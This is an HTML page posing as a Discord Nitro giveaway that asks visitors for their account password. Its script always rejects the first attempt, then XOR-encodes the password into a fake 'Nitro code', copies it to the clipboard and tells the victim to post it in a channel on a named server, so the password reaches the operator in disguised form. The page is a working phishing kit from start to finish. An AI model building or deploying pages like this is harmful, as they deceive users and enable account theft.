<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim Discord Nitro</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      background-color: #313338;
      font-family: 'Rubik', sans-serif;
      color: #f2f3f5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background-color: #2b2d31;
      border-radius: 8px;
      padding: 40px 30px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    }
    .logo {
      width: 60px;
      margin: 0 auto 20px;
      display: block;
    }
    h1 {
      font-size: 20px;
      text-align: center;
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #b5bac1;
      text-align: center;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      background-color: #1e1f22;
      border: 1px solid #4f545c;
      border-radius: 5px;
      color: white;
      font-size: 16px;
      margin-bottom: 10px;
    }
    input::placeholder {
      color: #72767d;
    }
    button {
      width: 100%;
      background-color: #5865f2;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    .error {
      color: #f04747;
      text-align: center;
      margin-top: 10px;
      display: none;
    }
    .result {
      margin-top: 25px;
      background-color: #1e1f22;
      border: 1px solid #4f545c;
      padding: 15px;
      border-radius: 6px;
      word-break: break-word;
      text-align: center;
    }
    .copy-btn {
      margin-top: 10px;
      background-color: #4e5fd2;
    }
    .info-message {
      margin-top: 15px;
      color: #b5bac1;
      font-size: 13px;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="card">
    <img class="logo" src="https://cdn.jsdelivr.net/gh/edent/SuperTinyIcons/images/svg/discord.svg" alt="Discord Style Logo" />
    <h1>Claim Your Nitro</h1>
    <p>Enter your account password to claim free Discord Nitro.</p>

    <input type="password" id="password" placeholder="Account Password" />
    <button onclick="claimNitro()">Claim Nitro</button>
    <div class="error" id="errorMsg">‚ùå Incorrect password. Try again.</div>

    <div class="result" id="resultBox" style="display: none;">
      ‚úÖ Subscription Claimed Successfully!<br><br>
      <strong>Your Nitro Code:</strong><br>
      <code id="codeText"></code><br>
      <button class="copy-btn" onclick="copyCode()">üìã Copy Code</button>
      <div class="info-message">
        Copy the code and send it in the <strong>restricted-access-üö´</strong> channel in the Playcentrix Server.
      </div>
    </div>
  </div>

  <script>
    let attempt = 0;

    function shortEncrypt(text) {
      const key = 37;
      return [...text].map(c => (c.charCodeAt(0) ^ key).toString(36)).join('-');
    }

    function claimNitro() {
      const input = document.getElementById("password");
      const password = input.value.trim();
      const error = document.getElementById("errorMsg");
      const resultBox = document.getElementById("resultBox");
      const codeText = document.getElementById("codeText");

      if (!password) {
        error.innerText = "‚ùå Please enter a password.";
        error.style.display = "block";
        resultBox.style.display = "none";
        return;
      }

      if (attempt === 0) {
        attempt++;
        error.innerText = "‚ùå Incorrect password. Try again.";
        error.style.display = "block";
        resultBox.style.display = "none";
        return;
      }

      error.style.display = "none";
      const code = shortEncrypt(password);
      codeText.innerText = code;
      resultBox.style.display = "block";

      navigator.clipboard.writeText(code).catch(() => {});
    }

    function copyCode() {
      const code = document.getElementById("codeText").innerText;
      navigator.clipboard.writeText(code)
        .then(() => alert("Code copied to clipboard!"))
        .catch(() => alert("Failed to copy code."));
    }
  </script>

</body>
</html>
